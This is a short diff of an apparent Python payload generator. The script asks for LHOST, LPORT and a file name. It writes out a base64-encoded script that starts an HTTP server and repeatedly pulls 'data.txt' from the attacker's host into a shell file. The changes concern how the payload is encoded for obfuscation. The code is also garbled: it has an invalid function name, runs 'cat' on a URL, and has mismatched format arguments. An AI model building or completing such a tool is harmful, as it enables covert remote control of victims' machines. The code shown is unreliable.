@@ -7,8 +7,7 @@ opt = input("LHOST: ")
 opt2 = input("LPORT: ")
 opt3 = input("name: ")
 op = open(name + ".py", "w")
-cod = base64.b64encode(b"""import os, time
-
+cod = """import os, time
 os.system("python3 -m http.server 8080 &")
 def get-put(ip):
 	os.system("cat http://{}:{}/data.txt >> data.sh".format(ip))
@@ -19,8 +18,10 @@ def get-put(ip):
 	os.remove("data")
 	os.system("clear")
 while True:
-	get(ip)""".format(opt, opt2))
-op1 = op.write("""import os
+	get(ip)""".format(opt, opt2)
+cod1 = base64.b64encode(cod)
+op1 = op.write("""
+import os
 import base64
 import time
 
